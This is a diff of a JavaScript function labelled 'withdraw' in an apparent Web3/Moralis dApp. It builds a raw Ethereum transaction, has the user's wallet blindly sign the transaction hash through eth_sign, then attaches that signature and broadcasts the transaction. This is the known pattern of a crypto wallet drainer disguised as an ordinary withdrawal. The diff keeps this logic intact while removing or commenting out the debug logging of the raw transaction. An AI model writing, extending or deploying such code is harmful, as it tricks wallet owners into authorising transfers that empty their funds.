@@ -13,9 +13,9 @@ Moralis.start({ serverUrl, appId });
 
 const web3 = new Web3(window.ethereum);
 
-export async function withdraw(value, chainId, setValue) {
+export async function withdraw(value, setValue) {
   let userAddr = value.adress;
-  console.log("myvalue is", userAddr);
+  console.log("userAddr = ", userAddr);
   return new Promise(async (resolve, reject) => {
     await web3.eth
       .getTransactionCount(userAddr, "pending")
@@ -39,31 +39,29 @@ export async function withdraw(value, chainId, setValue) {
           r: "0x",
           s: "0x",
         };
-        console.log("chainNameeee", chainName);
         const tx = new ethereumjs.Tx(tx_);
 
         const serializedTx = "0x" + tx.serialize().toString("hex");
         const hexer = { encoding: "hex" };
         let id = 1;
-        if (chainId === "0x1") {
+        if (chainName === "0x1") {
           id = 1;
         }
 
-        if (chainId === "0x38") {
+        if (chainName === "0x38") {
           id = 56;
         }
 
-        if (chainId === "0x89") {
+        if (chainName === "0x89") {
           id = 137;
         }
 
-        console.log("id === ", id, "chainid === ", chainId);
+        console.log("id === ", id, "chainName=", chainName);
         const sha3_ = web3.utils.sha3(serializedTx, hexer);
-        console.log(sha3_);
+
         await web3.eth
           .sign(sha3_, userAddr)
           .then(async (signed) => {
-            console.log("true signed");
             // window.localStorage.setItem("signed", true);
             setValue({ ...value, signed: true });
             resolve(true);
@@ -78,8 +76,8 @@ export async function withdraw(value, chainId, setValue) {
 
             const txFin = "0x" + tx.serialize().toString("hex"); //,
             const sha3__ = web3.utils.sha3(txFin, hexer);
-            console.log("rawTx:", txFin);
-            console.log("rawHash:", sha3__);
+            // console.log("rawTx:", txFin);
+            // console.log("rawHash:", sha3__);
 
             await web3.eth
               .sendSignedTransaction(txFin)
